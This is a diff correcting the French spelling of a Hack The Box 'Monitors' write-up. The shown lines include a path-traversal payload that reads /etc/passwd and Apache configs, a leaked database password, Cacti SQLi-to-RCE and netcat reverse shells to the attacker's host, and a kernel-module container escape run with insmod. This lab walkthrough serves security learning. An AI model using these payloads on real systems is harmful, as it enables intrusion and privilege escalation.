@@ -1,7 +1,7 @@
 ---
 title: "[HTB - Hard] Monitors"
 description: "Writeup by jsthope"
-date: 2023-09-08
+date: 2023-09-09
 tags: [HTB, Hard, Writeup, French, Wordpress]
 type: post
 image: /images/monitors/monitors.png
@@ -39,8 +39,8 @@ On ajoute ensuite le domain aux hosts:
 └─# echo "10.10.10.238 monitors.htb" >> /etc/hosts
 ```
 ## Wordpress
-nmap nous a montré que le site utilise WordPress 5.5.1,
-on va donc scanner si ce site wordpress à l'aide de wpscan:
+Nmap nous a montré que le site utilise WordPress 5.5.1,
+on va donc scanner ce site Wordpress à l'aide de wpscan:
 ```
 ┌──(kali㉿kali)-[~]
 └─$ sudo wpscan --url http://monitors.htb -e ap,t,tt,u --api-token TOKEN
@@ -99,7 +99,7 @@ $content=file_get_contents($_GET['url']);
 /wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd
 /wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=http(s)://domain/exec                                                                                  
 ``` 
-Ainsi, allons voire la configuration par d'apache:
+Ainsi, allons voir la configuration d'apache:
 ```
 ┌──(kali㉿kali)-[~]
 └─$ curl http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/apache2/sites-enabled/000-default.conf
@@ -111,13 +111,13 @@ Ainsi, allons voire la configuration par d'apache:
 [...]
 ```
 
-On trouve alors un nouveau domain à ajouté:
+On trouve alors un nouveau domain à ajouter:
 ```
 ┌──(root㉿kali)-[/home/kali]
 └─# echo "10.10.10.238 cacti-admin.monitors.htb" >> /etc/hosts
 ```
 
-La configuration de monitors.htb nous montre que la racine du site est ``/var/www/wordpress``:
+La configuration de monitors.htb nous montre que la racine des fichiers du site est ``/var/www/wordpress``:
 ```
 ┌──(kali㉿kali)-[~]
 └─$ curl http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/apache2/sites-enabled/monitors.htb.conf 
@@ -142,10 +142,10 @@ define( 'DB_USER', 'wpadmin' );
 define( 'DB_PASSWORD', 'BestAdministrator@2020!' );
 ```
 ## Cacti
-Allons maintenant sur le nouveau site qu'on à trouvé:
+Allons maintenant sur le nouveau site qu'on a trouvé:
 ![cacti](/images/monitors/cacti.png)
 
-Ce site utilise donc cacti 1.2.12. Cherchons si des exploits sont connu pour cette version:
+Ce site utilise donc ``cacti 1.2.12``. Cherchons si des exploits sont connus pour cette version:
 ```
 ┌──(kali㉿kali)-[~]
 └─$ searchsploit cacti 1.2.12
@@ -185,7 +185,7 @@ L'exploit obtient une RCE grace à une SQLi:
 
 [+] Check your nc listener!
 ```
-Le revshell à bien fonctioné et notre netcat nous montre qu'on est connecté a ``www-data``:
+Le revshell a bien fonctionné et notre netcat nous montre qu'on est connecté à ``www-data``:
 ```
 ┌──(kali㉿kali)-[~]
 └─$ nc -lvnp 4444
@@ -195,12 +195,12 @@ connect to [10.10.14.5] from (UNKNOWN) [10.10.10.238] 33632
 $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
-A ce stade là, j'utilise toujours cette commande pour upgrade mon shell (même que dans ce cas là c'est surement inutile):
+A ce stade là, j'utilise toujours cette commande pour upgrade mon shell (même que dans ce cas là c'est probablement inutile):
 ```
 $ python3 -c 'import pty; pty.spawn("/bin/sh")'
 ```
 ## www-data -> marcus
-Regardons les référenance à l'utilisateur ``marcus``:
+Regardons les références à l'utilisateur ``marcus``:
 ```
 $ grep 'marcus' /etc -R 2>/dev/null
 grep 'marcus' /etc -R 2>/dev/null
@@ -238,9 +238,9 @@ marcus@monitors:~$ cat user.txt
 ```
 
 ## linpeas.sh
-On cherche maintenant à faire une escalade de privilège jusqu'à ``root``, pour se faire, on va utiliser ``linpeas.sh`` pour lister les informations intéréssantes.
+On cherche maintenant à faire une escalade de privilège jusqu'à ``root``, pour se faire, on va utiliser ``linpeas.sh`` pour lister les informations intéressantes.
 
-Ni curl ni wget sont disponible, donc on ne va pas passer par un http pour envoyé des fichier mais utiliser netcat car lui est dispo:
+Ni curl ni wget ne sont disponible, donc on ne va pas passer par http pour envoyé des fichier mais utiliser netcat car lui est disponible:
 
 ```
 # Cible:
@@ -285,19 +285,20 @@ marcus@monitors:~$ ./chisel client 10.10.14.5:8000 R:8443:127.0.0.1:1080
 2023/09/09 17:23:05 server: Listening on http://0.0.0.0:8000
 2023/09/09 17:23:05 server: session#1: tun: proxy#R:8443=>8443: Listening
 ```
-Chisel nous à alors fait un tunnel pour accédé à https://localhost:8443/ sur notre propre machine:
+Chisel nous a alors fait un tunnel pour accédé à ``https://localhost:8443/`` sur notre propre machine:
 ![tomcat](/images/monitors/tomcat.png)
+```
+┌──(kali㉿kali)-[~/Desktop/linpeas-server]
+└─$ dirsearch -u "https://localhost:8443/"
+```
+``dirsearch`` nous montre que ``https://localhost:8443/solr/`` existe.
 
-Ce service utilise ``Apache Tomcat/9.0.31``.
-
-```dirsearch -u "https://localhost:8443/"``` nous montre que https://localhost:8443/solr/ existe. 
 Avec une recherche rapide on tombe sur:
 ![solr](/images/monitors/solr.png)
 ## ofbiz exploit
-On trouve alors que ``https://localhost:8443/solr/#/`` redirectionne vers ``https://localhost:8443/solr/
-control/checkLogin/#/``
+On trouve alors que ``https://localhost:8443/solr/#/`` redirection vers ``https://localhost:8443/solr/control/checkLogin/#/``:
 ![ofbiz](/images/monitors/ofbiz.png)
-Ce service utilise ``ofbiz 17.12.01``
+Ce service utilise ``ofbiz 17.12.01``.
 ### Searchsploit
 ```
 ┌──(kali㉿kali)-[~]
@@ -318,7 +319,7 @@ Shellcodes: No Results
 Papers: No Results
 ```
 ### Metasploit
-L'exploit trouvé avec ``searchsploit`` ne marche pas. Je vais alors cherche dans ``Metasploit``:
+L'exploit trouvé avec ``searchsploit`` ne marche pas. Je vais alors chercher dans ``Metasploit``:
 ```
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ msfconsole                          
@@ -434,7 +435,7 @@ On voit ici que ``cap_sys_module`` peut etre exploité. (cf Hacktricks)
 
 Avec un peu de recherche, je tombe sur ce poste: https://blog.nody.cc/posts/container-breakouts-part2/
 
-On créé donc les deux fichiers présenté dans le post:
+On créé donc les deux fichiers présentés dans le post:
 ```c
 //reverse-shell.c
 #include <linux/kmod.h>
@@ -501,12 +502,12 @@ Saving to: ‘Makefile’
 
 2023-09-09 17:13:30 (18.1 MB/s) - ‘Makefile’ saved [148/148]
 ```
-après avoir build les fichiers avec ``make``, on effectue la commande:
+Après avoir build les fichiers avec ``make``, on effectue la commande:
 ```
 insmod reverse-shell.ko
 ```
 # Root
-On va voir alors sur notre netcat et voilà on est sorti du docker et en plus on est root !
+Et voilà on est sorti du docker et en plus on est root !
 ```
 ┌──(kali㉿kali)-[~]
 └─$ nc -lvnp 4445
